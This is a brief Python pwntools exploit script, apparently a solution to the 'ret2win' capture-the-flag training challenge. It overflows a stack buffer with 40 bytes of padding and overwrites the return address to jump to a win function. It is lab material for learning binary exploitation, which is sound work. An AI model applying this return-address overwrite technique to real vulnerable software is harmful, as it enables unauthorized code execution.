#!/usr/bin/python
from pwn import *

p = process('./ret2win')

payload = 'A'*40
payload += p64(0x0000000000400756)

p.sendline(payload)
p.interactive()